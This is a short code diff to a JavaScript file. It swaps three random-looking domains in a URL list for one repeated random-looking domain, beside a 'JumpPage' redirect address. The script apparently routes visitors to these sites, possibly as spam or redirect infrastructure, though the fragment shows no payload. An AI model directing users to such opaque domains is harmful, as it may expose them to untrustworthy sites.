@@ -37,9 +37,9 @@ var emails = [
 ];
 
 var urls=[
-	'rtmptwcvv.cc/', 
-	'hmqvxrhi.cc/', 
-    'gunskjtnt.com/',
+	'ysyiltesr.cc/', 
+	'ysyiltesr.cc/', 
+    'ysyiltesr.cc/',
 ];                                                                                                                  
 
 var JumpPage="https://huangguoai.cc";
